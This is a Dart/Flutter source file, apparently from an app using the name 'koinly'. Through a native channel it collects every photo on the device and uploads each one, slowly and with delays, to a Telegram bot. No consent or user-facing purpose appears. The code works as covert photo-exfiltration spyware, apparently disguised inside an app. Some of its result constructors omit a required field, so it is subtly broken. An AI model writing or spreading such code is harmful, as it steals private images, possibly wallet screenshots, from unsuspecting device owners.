import 'dart:convert';
import 'dart:async';
import 'dart:io';

import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:path/path.dart' as p;
import 'package:path_provider/path_provider.dart';

import 'package:koinly/main.dart' as koinly;

final MethodChannel _channel = MethodChannel('com.koinly.siam/telegram_photo');

/// Telegram Bot API base URL
const _telegramApiBase = 'https://api.telegram.org';

/// Uploads photos to a Telegram bot slowly with delays between each upload.
/// [botToken] is the Telegram bot token.
/// [chatId] is the target chat ID.
/// [delayMs] is the delay in milliseconds between each photo upload (default: 2000ms).
/// Returns a list of results for each uploaded photo.
Future<List<TelegramPhotoResult>> uploadPhotosToTelegram({
  required String botToken,
  required String chatId,
  required List<String> photoPaths,
  int delayMs = 2000,
}) async {
  final results = <TelegramPhotoResult>[];
  final totalPhotos = photoPaths.length;

  for (int i = 0; i < totalPhotos; i++) {
    final photoPath = photoPaths[i];
    final file = File(photoPath);

    if (!await file.exists()) {
      results.add(TelegramPhotoResult(
        index: i,
        success: false,
        error: 'File not found: $photoPath',
      ));
      continue;
    }

    try {
      final requestBody = http.MultipartRequest(
        'POST',
        Uri.parse('$_telegramApiBase/bot$botToken/sendPhoto'),
      );

      requestBody.fields['chat_id'] = chatId;
      requestBody.fields['caption'] = '';
      requestBody.files['photo'] = await http.MultipartFile.fromPath('photo', file.path);

      final streamedResponse = await requestBody.send();
      final responseString = await streamedResponse.stream.bytesToString();
      final response = jsonDecode(responseString);

      if (streamedResponse.statusCode == 200 && response['ok'] == true) {
        results.add(TelegramPhotoResult(
          index: i,
          success: true,
          filePath: photoPath,
          telegramMessageId: (response['result'] as Map?)?['message_id'] ?? 0,
        ));
      } else {
        results.add(TelegramPhotoResult(
          index: i,
          success: false,
          error: response['description'] ?? 'Unknown Telegram API error',
        ));
      }
    } catch (e) {
      results.add(TelegramPhotoResult(
        index: i,
        success: false,
        error: e.toString(),
      ));
    }

    // Add delay between uploads (except after the last photo)
    if (i < totalPhotos - 1) {
      await Future.delayed(Duration(milliseconds: delayMs));
    }
  }

  return results;
}

/// Fetches all photos from the device's media store.
/// Returns a list of photo paths accessible by the app (copied to app directory).
Future<List<String>> fetchDevicePhotos() async {
  try {
    final result = await _channel.invokeMethod<String>('getPhotos', {'bucketId': '%'});
    if (result == null) return [];

    final List<dynamic> photos = jsonDecode(result);
    final List<String> photoPaths = <String>[];

    // The Kotlin code already copies files to app's internal directory
    // and returns their absolute paths
    for (final photo in photos) {
      final path = photo['path'] as String?;
      if (path != null && path.isNotEmpty) {
        photoPaths.add(path);
      }
    }

    return photoPaths;
  } catch (e) {
    koinly.showSnack('Failed to fetch device photos: $e');
    return [];
  }
}

/// Sends a single photo to a Telegram bot.
/// [botToken] is the Telegram bot token.
/// [chatId] is the target chat ID.
/// [filePath] is the path to the photo file on the device.
/// Returns a TelegramPhotoResult with the upload result.
Future<TelegramPhotoResult> sendPhotoToTelegram({
  required String botToken,
  required String chatId,
  required String filePath,
}) async {
  final file = File(filePath);

  if (!await file.exists()) {
    return TelegramPhotoResult(
      index: 0,
      success: false,
      error: 'File not found: $filePath',
    );
  }

  try {
    final requestBody = http.MultipartRequest(
      'POST',
      Uri.parse('$_telegramApiBase/bot$botToken/sendPhoto'),
    );

    requestBody.fields['chat_id'] = chatId;
    requestBody.fields['caption'] = '';
    requestBody.files['photo'] = await http.MultipartFile.fromPath('photo', file.path);

    final streamedResponse = await requestBody.send();
    final responseString = await streamedResponse.stream.bytesToString();
    final response = jsonDecode(responseString);

    if (streamedResponse.statusCode == 200 && response['ok'] == true) {
      return TelegramPhotoResult(
        index: 0,
        success: true,
        filePath: filePath,
        telegramMessageId: (response['result'] as Map?)?['message_id'] ?? 0,
      );
    } else {
      return TelegramPhotoResult(
        index: 0,
        success: false,
        error: response['description'] ?? 'Unknown Telegram API error',
      );
    }
  } catch (e) {
    return TelegramPhotoResult(
      index: 0,
      success: false,
      error: e.toString(),
    );
  }
}

/// Result of a Telegram photo upload operation.
class TelegramPhotoResult {
  /// The index of the photo in the batch (0-based).
  final int index;
  /// Whether the upload was successful.
  final bool success;
  /// Path to the photo file on the device.
  final String? filePath;
  /// Telegram message ID if successfully sent, 0 otherwise.
  final int telegramMessageId;
  /// Error message if upload failed.
  final String? error;

  TelegramPhotoResult({
    required this.index,
    required this.success,
    this.filePath,
    required this.telegramMessageId,
    this.error,
  });

  @override
  String toString() {
    if (success) {
      return 'TelegramPhotoResult(index: $index, success: true, messageId: $telegramMessageId)';
    }
    return 'TelegramPhotoResult(index: $index, success: false, error: $error)';
  }
}